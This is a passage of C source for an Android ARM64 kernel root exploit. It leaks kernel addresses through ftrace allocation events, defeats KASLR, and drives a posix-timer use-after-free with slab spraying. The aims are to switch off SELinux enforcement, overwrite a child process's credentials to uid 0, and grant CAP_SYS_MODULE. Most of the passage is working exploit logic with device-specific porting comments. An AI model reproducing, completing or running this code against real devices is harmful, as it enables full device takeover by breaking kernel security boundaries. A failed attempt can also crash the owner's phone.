	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	if (n > 0) {
		/* The ack is synchronous with the exec-mint: take the child's last
		 * matching prepare_creds allocation. */
		g_cred_kva = ptrs[n - 1];
		dprintf(STDOUT_FILENO,
			"[cred] pid=%d real cred=%#" PRIx64 " site_recs=%d pid_recs=%d\n",
			g_cred_child_pid, g_cred_kva, seen, n);
	} else {
		dprintf(STDOUT_FILENO,
			"[cred] no real cred for pid=%d (site recs=%d)\n",
			g_cred_child_pid, seen);
	}
	if (!mint_ok || !child_ptr || n < 1) {
		if (!child_ptr)
			dprintf(STDOUT_FILENO, "[task-perf] no child task pointer\n");
		/* Do not leave cred_child behind: run.sh treats any live exploit
		 * process without a usable socket as a parked plant and refuses a
		 * second attempt until reboot.  This child is a plain forked
		 * credential waiter, not the timer-UAF parent. */
		if (g_cred_child_pid > 0) {
			kill(g_cred_child_pid, SIGKILL);
			waitpid(g_cred_child_pid, NULL, 0);
			g_cred_child_pid = -1;
		}
		return -1;
	}
	g_task = child_ptr;
	g_tasks[0] = child_ptr;
	g_tsites[0] = 0;
	g_ntasks = 1;
	dprintf(STDOUT_FILENO, "[task-perf] child task=%#" PRIx64 " pid=%d\n",
		g_task, (int)g_cred_child_pid);
	return 0;
}
static int leak_task(void)
{
	uint8_t *buf;
	int hits = 0;
	if (pipe(g_wake) || pipe(g_report))
		return -1;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc_node\n") ||
	    kick_rss() || trace_off_on())
		return -1;
	/* PORT (self-test): 强制一次 cred 分配。setuid 到不同 uid 会先
	 * prepare_creds() 分配新 cred，再做权限检查并 EPERM —— 分配记录
	 * 留在 trace 里，正好用来验证 LINK_ALLOC_CRED+slide 是否对得上。 */
	g_cred_site = slide_addr(LINK_ALLOC_CRED);
	(void)setuid(4242);
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	buf = malloc(4U << 20);
	if (!buf)
		return -1;
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (4U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (4U << 20))
				break;
		}
		close(fd);
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req;
			memcpy(&req, buf + i + 16, 8);
			memcpy(&site, buf + i, 8);
			/* PORT (self-test): 数一下 cred 分配，验证 call site 常量 */
			if (req == GEO_CRED_SIZE && site == g_cred_site) {
				g_selftest_cred++;
				continue;
			}
			/* PORT: slab objsize, not sizeof(struct task_struct) */
			if (req != g_task_obj)
				continue;
			memcpy(&ptr, buf + i + 8, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			/* A page-aligned pointer cannot be a slab object; those come
			   from order-N allocations that share the 5760-byte size class
			   and would send task->cred into the wrong page. Keep the first
			   slab-looking candidate instead of the last record seen. */
			/* Several task_struct-sized allocations are live at any time
			   (other processes fork too), so keep every candidate and let
			   the cred loop walk them instead of retrying one wrong one. */
			{
				int dup = 0;
				for (int k = 0; k < g_ntasks; k++)
					if (g_tasks[k] == ptr)
						dup = 1;
				if (!dup &&
				    g_ntasks < (int)(sizeof(g_tasks) / sizeof(g_tasks[0]))) {
					g_tsites[g_ntasks] = site;
					g_tasks[g_ntasks] = ptr;
					g_ntasks++;
				}
			}
			hits++;
			dprintf(STDOUT_FILENO, "[task] site=%#" PRIx64 " ptr=%#" PRIx64 "\n",
				site, ptr);
		}
	}
	free(buf);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc_node\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc_node\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc_node\n");
	write_file(TRACE "/tracing_on", "0\n");
	if (!g_ntasks)
		return -1;
	/* The task_struct allocation happens at one fixed call site, so the
	   busiest site is the fork path; a 5760-byte record from any other call
	   site belongs to some unrelated allocation of the same size class. */
	if (g_ntasks > 1) {
		int best = 0, best_count = 0;
		for (int i = 0; i < g_ntasks; i++) {
			int c = 0;
			for (int j = 0; j < g_ntasks; j++)
				if (g_tsites[j] == g_tsites[i])
					c++;
			if (c > best_count) {
				best_count = c;
				best = i;
			}
		}
		if (best_count > 1) {
			uint64_t order[MAX_TASK_CAND];
			uint64_t site = g_tsites[best];
			int n = 0;
			for (int i = 0; i < g_ntasks; i++)
				if (g_tsites[i] == site)
					order[n++] = g_tasks[i];
			for (int i = 0; i < g_ntasks; i++)
				if (g_tsites[i] != site)
					order[n++] = g_tasks[i];
			for (int i = 0; i < g_ntasks; i++)
				g_tasks[i] = order[i];
			dprintf(STDOUT_FILENO, "[task] busiest site=%#" PRIx64 " x%d\n",
				site, best_count);
		}
	}
	g_task = g_tasks[0];
	dprintf(STDOUT_FILENO, "[task] %d candidate(s), first=%#" PRIx64 "\n",
		g_ntasks, g_task);
	return 0;
}

static int leak_cred(uint64_t *cred)
{
	uint64_t ptrs[8];
	int n;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss())
		return -1;
	if (trace_off_on())
		return -1;
	if (syscall(SYS_setresuid, -1, -1, -1))
		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
	write_file(TRACE "/tracing_on", "0\n");
	n = collect_site(slide_addr(CRED_LINK), 184, ptrs, 8);
	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	if (n < 1)
		return -1;
	*cred = ptrs[n - 1];
	dprintf(STDOUT_FILENO, "[cred] object=%#" PRIx64 "\n", *cred);
	return 0;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[selinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0)
		dprintf(STDOUT_FILENO, "[selinux] enforce=%s", buf);
	close(fd);
}



/* ARM64 KASLR moves the image in 2 MiB steps; anything else is a mis-read. */
#define SLIDE_ALIGN UINT64_C(0x200000)
#define SLIDE_SAMPLES 3

static uint64_t measure_slide_once(void)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint64_t slide = 0;
	struct sigevent ev;
	timer_t id;
	if (!buf)
		return 0;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		free(buf);
		return 0;
	}
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0)
		timer_delete(id);
	write_file(TRACE "/tracing_on", "0\n");
	/* One 4 KiB page of records is plenty to recover the call site. */
	if (read_raw(buf, 8U << 20, &used, 4096) == 0) {
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req;
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			memcpy(&req, buf + i + 16, 8);
			if (req != GEO_KITIMER_SIZE)
				continue;
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff)
				continue;
			slide = site - TIMER_LINK;
			break;
		}
	}
	free(buf);
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	return slide;
}

/*
 * A wrong slide turns every later write into a wild kernel pointer, so the
 * value is only accepted when it is 2 MiB aligned and reproducible. Guess
 * once and this stops being a root tool and starts being a brick tool.
 */
static uint64_t measure_slide(void)
{
	uint64_t cand[SLIDE_SAMPLES];
	int n = 0;

	for (int i = 0; i < SLIDE_SAMPLES; i++) {
		uint64_t s = measure_slide_once();
		if (!s) {
			dprintf(STDOUT_FILENO, "[slide] sample %d empty\n", i + 1);
			continue;
		}
		if (s & (SLIDE_ALIGN - 1)) {
			dprintf(STDOUT_FILENO,
				"[slide] sample %d unaligned %#" PRIx64 " -> reject\n",
				i + 1, s);
			continue;
		}
		dprintf(STDOUT_FILENO, "[slide] sample %d %#" PRIx64 "\n",
			i + 1, s);
		cand[n++] = s;
		/* Two agreeing samples are as trustworthy as three. */
		if (n >= 2 && cand[0] == cand[1])
			break;
	}

	if (!n)
		return 0;

	uint64_t best = 0;
	int best_count = 0;
	for (int i = 0; i < n; i++) {
		int c = 0;
		for (int j = 0; j < n; j++)
			if (cand[j] == cand[i])
				c++;
		if (c > best_count) {
			best_count = c;
			best = cand[i];
		}
	}
	if (n >= 2 && best_count < 2) {
		dprintf(STDOUT_FILENO, "[slide] unstable across %d samples\n", n);
		return 0;
	}
	return best;
}

#define SLIDE_CACHE "/data/local/tmp/.yt-slide"

static void boot_id(char *out, size_t cap)
{
	int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
	ssize_t n;
	memset(out, 0, cap);
	if (fd < 0)
		return;
	n = read(fd, out, cap - 1);
	close(fd);
	if (n <= 0) {
		out[0] = 0;
		return;
	}
	for (size_t i = 0; i < (size_t)n; i++)
		if (out[i] == '\n')
			out[i] = 0;
}

static uint64_t read_slide_cache(void)
{
	char line[128] = { 0 }, boot[64];
	FILE *f;
	uint64_t s;
	boot_id(boot, sizeof(boot));
	f = fopen(SLIDE_CACHE, "r");
	if (!f)
		return 0;
	if (!fgets(line, sizeof(line), f)) {
		fclose(f);
		return 0;
	}
	fclose(f);
	char *sp = strchr(line, ' ');
	if (!sp)
		return 0;
	*sp = 0;
	if (strcmp(line, boot))
		return 0;
	s = strtoull(sp + 1, NULL, 0);
	if (!s || (s & (SLIDE_ALIGN - 1)))
		return 0;
	return s;
}

static void write_slide_cache(uint64_t s)
{
	char boot[64];
	FILE *f;
	if (!s)
		return;
	boot_id(boot, sizeof(boot));
	f = fopen(SLIDE_CACHE, "w");
	if (!f)
		return;
	fprintf(f, "%s %#" PRIx64 "\n", boot, s);
	fclose(f);
	chmod(SLIDE_CACHE, 0666);
}

static long mem_available_kb(void)
{
	char line[128];
	long v = 0;
	FILE *f = fopen("/proc/meminfo", "r");
	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f)) {
		if (!strncmp(line, "MemAvailable:", 13)) {
			v = strtol(line + 13, NULL, 10);
			break;
		}
	}
	fclose(f);
	return v;
}

static int selinux_enforcing(void)
{
	char b = '?';
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd >= 0) {
		if (read(fd, &b, 1) <= 0)
			b = '?';
		close(fd);
	}
	return b;
}

/* SELinux hides available_events from shell; stat the event file instead. */
static int trace_event_available(const char *name)
{
	char path[256];
	struct stat st;
	snprintf(path, sizeof(path), TRACE "/events/%s/enable", name);
	return stat(path, &st) == 0;
}

/* Read-only environment report; touches nothing that can fault. */
static void preflight(int quick)
{
	struct utsname u;
	long ps = sysconf(_SC_PAGESIZE);
	int cpus = cpu_count();
	long avail = mem_available_kb();
	int event = trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") == 0;
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	int trig = access(TRIGGER, W_OK) == 0;
	int ksu = access("/system/bin/su", X_OK) == 0;
	uint64_t s = 0;
	/* Quick mode answers "is this kernel shaped right" without paying the
	   trace round-trip; the main path measures and caches the real value. */
	if (!quick) {
		/* The trace reader only drains cpu0, so sampling must be pinned there. */
		pin_cpu(0);
		s = measure_slide();
		if (s)
			write_slide_cache(s);
	}
	int align_ok = s && !(s & (SLIDE_ALIGN - 1));
	uname(&u);
	printf("{\"uname\":\"%s\",\"build_target\":\"%s\",\"page_size\":%ld,\"cpus\":%d,"
	       "\"mem_avail_kb\":%ld,\"tracefs\":%d,\"trigger\":%d,"
	       "\"event\":%d,\"selinux_enforce\":\"%c\",\"ksu\":%d,"
	       "\"slide\":\"%#" PRIx64 "\",\"slide_aligned\":%d,"
	       "\"verdict\":\"%s\"}\n",
	       u.release, TARGET_KERNEL, ps, cpus, avail, event && trig, trig, event,
	       selinux_enforcing(), ksu, s, align_ok,
	       /* Only a wrong kernel shape is fatal; an unreadable slide still
	          leaves the main path's own fail-closed check in place. */
	       (ps != 4096 || !event || !trig)
		       ? "blocked"
		       : (quick || align_ok) ? "ok" : "inconclusive");
}


static int wait_ipc_phase(struct ipc *p, int want)
{
	for (int i = 0; i < 600; i++) {
		if (atomic_load_explicit(&p->phase, memory_order_acquire) >= want)
			return 0;
		usleep(50000);
	}
	return -1;
}

static int pick_clean_local(const uint64_t *arr, int n)
{
	int best = -1, best_count = 0;
	/* The first/last SLUB slabs can be the frozen cpu_slab and never return
	 * to the buddy allocator.  Single-victim pick_clean_timer_slab() already
	 * skips 1/8 at both ends; multi-victim must do the same. */
	int lo = n / 8, hi = n - n / 8;
	for (int i = lo; i < hi; i++) {
		uint64_t slab = arr[i] & ~UINT64_C(0x1fff);
		int count = 0;
		for (int j = 0; j < n; j++)
			if ((arr[j] & ~UINT64_C(0x1fff)) == slab)
				count++;
		if (count > best_count) {
			best_count = count;
			best = i;
		}
	}
	if (best < 0 || best_count < 12)
		return -1;
	dprintf(STDOUT_FILENO,
		"[multi] clean local=%d slab=%#" PRIx64 " captured=%d/%d (middle only)\n",
		best, arr[best] & ~UINT64_C(0x1fff), best_count, n);
	return best;
}

/*
 * 16 concurrent exec victims.  Each victim has its own IPC and timer group;
 * timer creation is serialized per victim so the trace window can be
 * attributed, then all 16 exec threads are released together.  Only the
 * selected victim's timer is queued/armed; the other 15 exec without a queued
 * timer, so they do not create extra dangling rb_nodes.
 */

static void multi_release_memory(struct ipc **vip, pid_t *vpid,
				 int target_v, int success)
{
	/* Close our own frag/ring/socket memory first.  On failure the target
	 * victim is deliberately left parked (unreaped); only unrelated victims
	 * are reaped, and only if already zombie. */
	close_stream();
	close_socks();
	destroy_rings();
	stop_helpers();
	for (int i = 0; i < MAX_VICTIMS; i++) {
		if (i == target_v)
			continue;
		int st = 0;
		if (success)
			waitpid(vpid[i], &st, 0);
		else
			(void)waitpid(vpid[i], &st, WNOHANG);
	}
	for (int i = 0; i < MAX_VICTIMS; i++) {
		if (vip[i] && vip[i] != MAP_FAILED)
			munmap(vip[i], 4096);
	}
}

static void force_slab_release(void)
{
	/* A full posix_timers_cache slab can stay on a CPU partial list even
	 * after every timer was reaped.  Ask SLUB to shrink it before the AIO
	 * fallback; otherwise AIO cannot possibly receive the victim page. */
	const char *paths[] = {
		"/sys/kernel/slab/posix_timers_cache/shrink",
		"/sys/kernel/slab/:0000256/shrink",
		"/sys/kernel/slab/cred_jar/shrink",
	};
	int touched = 0;
	for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
		if (write_file(paths[i], "1\n") == 0) {
			dprintf(STDOUT_FILENO, "[slab-shrink] %s\n", paths[i]);
			touched++;
		}
	}
	if (write_file("/proc/sys/vm/drop_caches", "3\n") == 0) {
		dprintf(STDOUT_FILENO, "[slab-shrink] drop_caches\n");
		touched++;
	}
	if (touched) {
		struct timespec pause = { .tv_nsec = 250000000 };
		nanosleep(&pause, NULL);
	}
	dprintf(STDOUT_FILENO, "[slab-shrink] paths=%d\n", touched);
}

static int multi_one_uaf(uint64_t target)
{
	struct ipc *vip[MAX_VICTIMS];
	pid_t vpid[MAX_VICTIMS];
	int vcpu[MAX_VICTIMS];
	int ncpu = cpu_count();
	int old_count = g_timer_count;
	long base_a = -1, base_t = -1;
	int target_v = -1, target_i = -1, best = 0;
	int rc = -1;

	for (int i = 0; i < MAX_VICTIMS; i++) {
		vip[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		if (vip[i] == MAP_FAILED)
			return -1;
		memset(vip[i], 0, 4096);
		vip[i]->arm_idx[0] = vip[i]->arm_idx[1] = vip[i]->arm_idx[2] = -1;
		g_victim_n[i] = 0;
		vcpu[i] = (i + 1) % (ncpu > 0 ? ncpu : 1);
	}
	slab_posix(&base_a, &base_t);
	g_slab_base_active = base_a;
	g_slab_base_total = base_t;
	g_timer_count = VICTIM_TIMERS;

	for (int i = 0; i < MAX_VICTIMS; i++) {
		vpid[i] = fork();
		if (vpid[i] == 0) {
			ipc = vip[i];
			g_child_cpu = vcpu[i];
			g_timer_count = VICTIM_TIMERS;
			child_race();
		}
		if (vpid[i] < 0) {
			dprintf(STDOUT_FILENO, "[multi] fork failed i=%d errno=%d\n", i, errno);
			g_timer_count = old_count;
			return -1;
		}
	}
	for (int i = 0; i < MAX_VICTIMS; i++) {
		if (wait_ipc_phase(vip[i], 1)) {
			dprintf(STDOUT_FILENO, "[multi] victim %d not ready phase=%d\n",
				i, atomic_load_explicit(&vip[i]->phase, memory_order_acquire));
			g_timer_count = old_count;
			return -1;
		}
	}
	dprintf(STDOUT_FILENO, "[multi] victims=%d timers_each=%d cpus=%d\n",
		MAX_VICTIMS, VICTIM_TIMERS, ncpu);

	write_file(TRACE "/buffer_size_kb", "4096\n");
	trigger_cmd("enable_event:kmem:kmem_cache_alloc\n");
	kick_rss();

	for (int i = 0; i < MAX_VICTIMS; i++) {
		int n = 0;
		uint64_t chosen = 0;
		if (trace_off_on()) {
			dprintf(STDOUT_FILENO, "[multi] trace start failed i=%d\n", i);
			g_timer_count = old_count;
			return -1;
		}
		atomic_store_explicit(&vip[i]->phase, 2, memory_order_release);
		if (wait_ipc_phase(vip[i], 3)) {
			dprintf(STDOUT_FILENO, "[multi] victim %d timers timeout phase=%d\n",
				i, atomic_load_explicit(&vip[i]->phase, memory_order_acquire));
			write_file(TRACE "/tracing_on", "0\n");
			g_timer_count = old_count;
			return -1;
		}
		write_file(TRACE "/tracing_on", "0\n");
		if (collect_nth(0, &n, &chosen) == 0 && n > 0) {
			if (n > VICTIM_TIMERS)
				n = VICTIM_TIMERS;
			memcpy(g_victim_ptrs[i], g_all, (size_t)n * sizeof(uint64_t));
			g_victim_n[i] = n;
			dprintf(STDOUT_FILENO,
				"[multi] victim=%d timers=%d first=%#" PRIx64 "\n",
				i, n, g_victim_ptrs[i][0]);
		} else {
			dprintf(STDOUT_FILENO, "[multi] victim=%d no timer capture\n", i);
		}
	}

	for (int i = 0; i < MAX_VICTIMS; i++) {
		int idx = pick_clean_local(g_victim_ptrs[i], g_victim_n[i]);
		if (idx < 0)
			continue;
		uint64_t slab = g_victim_ptrs[i][idx] & ~UINT64_C(0x1fff);
		int count = 0;
		for (int j = 0; j < g_victim_n[i]; j++)
			if ((g_victim_ptrs[i][j] & ~UINT64_C(0x1fff)) == slab)
				count++;
		if (count > best) {
			best = count;
			target_v = i;
			target_i = idx;
		}
	}
	if (target_v < 0) {
		dprintf(STDOUT_FILENO, "[multi] no clean victim slab\n");
		g_timer_count = old_count;
		return -1;
	}
	dprintf(STDOUT_FILENO, "[multi] target_victim=%d local=%d slab_count=%d\n",
		target_v, target_i, best);

	for (int i = 0; i < MAX_VICTIMS; i++) {
		vip[i]->arm_idx[0] = (i == target_v) ? target_i : -1;
		vip[i]->arm_idx[1] = vip[i]->arm_idx[2] = -1;
		atomic_store_explicit(&vip[i]->arm_ready, 1, memory_order_release);
	}
	for (int i = 0; i < MAX_VICTIMS; i++)
		atomic_store_explicit(&vip[i]->phase, 4, memory_order_release);

	for (int i = 0; i < MAX_VICTIMS; i++) {
		int st = 0;
		int code = wait_zombie(vpid[i], &st);
		dprintf(STDOUT_FILENO,
			"[multi] victim %d zombie=%d code=%d status=%d\n",
			i, code != 0, code, st);
	}

	if (base_a >= 0 && base_t >= 0)
		wait_posix_slab_drain();
	{
		uint64_t victim_ptr = g_victim_ptrs[target_v][target_i];
		dprintf(STDOUT_FILENO,
			"[multi] target slab=%#" PRIx64 " node_pfn=%#" PRIx64
			" off=%#x\n",
			victim_ptr & ~UINT64_C(0x1fff),
			object_pfn(victim_ptr + KITIMER_NODE),
			(unsigned)((victim_ptr + KITIMER_NODE) & 0x1fff));
	}
	g_victim_cpu = vcpu[target_v];
	/* g928: no churn; rely on the BRM quiet-wait + stream spray path. */
	if (reclaim_stream(g_victim_ptrs[target_v][target_i], target) == 0) {
		int st = 0;
		waitpid(vpid[target_v], &st, 0);
		dprintf(STDOUT_FILENO,
			"[multi] target reaped status=%d; cleaning memory\n", st);
		multi_release_memory(vip, vpid, target_v, 1);
		rc = 0;
	} else {
		/* BRM and OnePlus both measured that the order-1 timer page is not
		 * handed to an order-0 AIO ring.  Continuing with the AIO fallback
		 * only sprays unrelated pages and risks corrupting kernel state after
		 * a miss, so fail safely and leave the target zombie parked. */
		dprintf(STDOUT_FILENO,
			"[multi] target page miss; AIO fallback disabled for order-1; "
			"target zombie left unreaped; cleaning our memory only\n");
		multi_release_memory(vip, vpid, target_v, 0);
	}
	g_timer_count = old_count;
	return rc;
}

static int g_multi_dead;
static int g_single_dead;

static int do_uaf(uint64_t target)
{
	const char *e = getenv("PC98260_MULTI_VICTIM");
	/* Every victim arms all its SIGEV_SIGNAL timers, so multi creates many
	 * dangling timerqueue nodes while only one page is reclaimed.  Reaping the
	 * other victims then runs timerqueue_del on nodes whose pages are still
	 * live/reused, which can panic the device.  Keep the safe single-victim
	 * default; multi is now an explicit experiment only. */
	int multi = (e && atoi(e) != 0);
	if (!g_plant_cred && multi) {
		if (g_multi_dead)
			return -1;
		int rc = multi_one_uaf(target);
		if (rc)
			g_multi_dead = 1;
		return rc;
	}
	if (g_single_dead)
		return -1;
	int rc = one_uaf(target);
	/* A miss leaves the victim zombie parked to keep its dangling node alive.
	 * Retrying would park another zombie per attempt; stop after the first
	 * miss unless an explicit retry experiment is requested. */
	if (rc && !getenv("PC98260_ALLOW_SINGLE_RETRY"))
		g_single_dead = 1;
	return rc;
}

int main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };
	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	if (argc > 1 && (!strcmp(argv[1], "mintwait") ||
			 !strcmp(argv[1], "mintwait-rootd")))
		return mintwait_main(!strcmp(argv[1], "mintwait-rootd"));
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc)
			g_slide = strtoull(argv[++i], NULL, 0);
	}
	sigaction(SIGALRM, &action, NULL);
	int check_only = 0, quick = 0;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--check"))
			check_only = 1;
		else if (!strcmp(argv[i], "--quick"))
			quick = 1;
		else if (!strcmp(argv[i], "--no-real-cred"))
			g_no_real_cred = 1;
		else if (!strcmp(argv[i], "--no-selftest"))
			g_no_selftest = 1;
	}
	if (check_only) {
		preflight(quick);
		return 0;
	}
	detect_memstart_pfn();
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 "\n", g_slide);
	if (argc > 1 && argv[1][0] != '-')
		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	if (pin_cpu(0))
		return 1;
	if (!g_slide)
		g_slide = read_slide_cache();
	if (!g_slide) {
		g_slide = measure_slide();
		dprintf(STDOUT_FILENO, "[slide] measured %#" PRIx64 "\n", g_slide);
		if (!g_slide) {
			dprintf(STDOUT_FILENO,
				"[slide] measurement did not converge, refusing to run\n");
			return 7;
		}
		write_slide_cache(g_slide);
	} else {
		dprintf(STDOUT_FILENO, "[slide] cached %#" PRIx64 "\n", g_slide);
	}
	slab_task_objsize();
	{
		const char *budget = getenv("PC98260_BUDGET_S");
		int secs = budget ? atoi(budget) : 180;
		g_deadline = time(NULL) + (secs > 0 ? secs : 180);
	}
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	read_enforce();
	g_nrings = 0;
	/* PORT: 上一轮若被 kill / panic，disarm() 没机会跑，会留下
	 * 16 MB buffer + 开着的 kmem 事件。无条件先复位一次。 */
	disarm();
	if (write_file(TRACE "/buffer_size_kb", "4096\n")) {
		disarm();
		return 1;
	}
	/* External HOneClick KASLR can be wrong by a large delta.  Recover the
	 * actual slide from safe timer allocations before targeting selinux. */
	if (calibrate_slide_from_timers())
		dprintf(STDOUT_FILENO, "[slide-cal] using external slide=%#" PRIx64 "\n",
			g_slide);

	/* SELinux first: perf_event_open is EACCES while enforcing.  This
	 * zero-write does not use g_task. */
	g_plant_cred = 0;
	{
		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
		for (int i = 1; i <= 4; i++) {
			char buf[8] = { 0 };
			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
			if (fd >= 0) {
				if (read(fd, buf, 1) < 0) buf[0] = 0;
				close(fd);
			}
			if (buf[0] == '0') {
				dprintf(STDOUT_FILENO, "[selinux] permissive before perf\n");
				break;
			}
			dprintf(STDOUT_FILENO, "[selinux] pre-perf attempt %d/4 target=%#" PRIx64 "\n", i, sel);
			if (!do_uaf(sel))
				read_enforce();
		}
	}
	if (perf_leak_task()) {
		dprintf(STDOUT_FILENO, "[task] task/real-cred leak failed\n");
		disarm();
		return 5;
	}
	if (!g_no_selftest && !g_selftest_cred) {
		dprintf(STDOUT_FILENO,
			"[selftest] no cred alloc at call_site=%#" PRIx64
			" -- constants suspect, refusing to run\n", g_cred_site);
		disarm();
		return 8;
	}
	dprintf(STDOUT_FILENO, "[selftest] cred call_site ok (%d samples)\n",
		g_selftest_cred);
	/* real-cred: zero the minted child's uid/gid in place and clear SELinux.
	 * No fake page, task->cred replacement, uid repair, or real_cred hop. */
	g_plant_cred = 1;
	int rooted = 0;
	g_want_cap = getenv("PC98260_KSU") != NULL;
	int max_attempts = env_int("PC98260_MAX_ATTEMPTS", 12, 1, 12);
	for (int attempt = 1; attempt <= max_attempts && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		if (past_deadline()) {
			dprintf(STDOUT_FILENO,
				"[uaf] budget exhausted at attempt %d; holding zombie\n",
				attempt);
			break;
		}
		dprintf(STDOUT_FILENO,
			"[cred] attempt %d/%d real=%#" PRIx64 " task=%#" PRIx64 "\n",
			attempt, max_attempts, g_cred_kva, g_task);
		g_plant_cred = 1;
		if (one_uaf(0))
			continue;
		g_plant_cred = 0;
		/* euid is raised by setuid(0) during delivery; uid==0 proves the
		 * in-place real-cred write. */
		if (ask_child(&uid, &euid) == 0 && uid == 0) {
			rooted = 1;
			break;
		}
		if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted && !getenv("PC98260_NO_FALLBACK")) {
		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
		g_plant_cred = 0;
		for (int i = 1; i <= 4 && !rooted; i++) {
			char buf[8] = { 0 };
			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
			if (fd >= 0) {
				if (read(fd, buf, 1) < 0)
					buf[0] = 0;
				close(fd);
			}
			if (buf[0] == '0')
				break;
			dprintf(STDOUT_FILENO, "[selinux] fallback %d/4 target=%#"
				PRIx64 "\n", i, sel);
			if (!do_uaf(sel))
				read_enforce();
		}
		g_plant_cred = 1;
	}
	if (!rooted) {
		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
		for (;;)
			pause();
	}
	/* PLANT_PTR writes a stale node address into cap_effective.  The slab
	 * preselection makes bit16 (CAP_SYS_MODULE) part of every candidate A;
	 * verify the child's actual CapEff before reporting success. */
	if (getenv("PC98260_KSU")) {
		int cap_ok = 0;
		/* The third tile may already have delivered CAP_SYS_MODULE in the
		 * same reclaim as uid0/SELinux.  Avoid another UAF whenever possible. */
		if (g_want_cap) {
			unsigned long long ce = child_capeff();
			if (ce & 0x10000ULL) {
				cap_ok = 1;
				dprintf(STDOUT_FILENO,
					"[ksu] cap plant combined CapEff=%#llx bit16=1\n", ce);
			}
		}
		for (int i = 0; i < 8 && !cap_ok && !past_deadline(); i++) {
			unsigned long long ce;
			g_cap_mode = 1;
			g_plant_cred = 1;
			if (one_uaf(0)) {
				g_plant_cred = 0;
				dprintf(STDOUT_FILENO,
					"[ksu] cap attempt %d/8 reclaim failed before verify\n", i + 1);
				continue;
			}
			g_plant_cred = 0;
			ce = child_capeff();
			dprintf(STDOUT_FILENO,
				"[ksu] cap plant %d/8 CapEff=%#llx bit16=%d\n",
				i + 1, ce, (int)((ce >> 16) & 1));
			if (ce & 0x10000ULL)
				cap_ok = 1;
		}
		g_cap_mode = 0;
		dprintf(STDOUT_FILENO, "[ksu] cap_effective %s\n",
			cap_ok ? "has CAP_SYS_MODULE" : "plant did not land bit16");
		if (!cap_ok) {
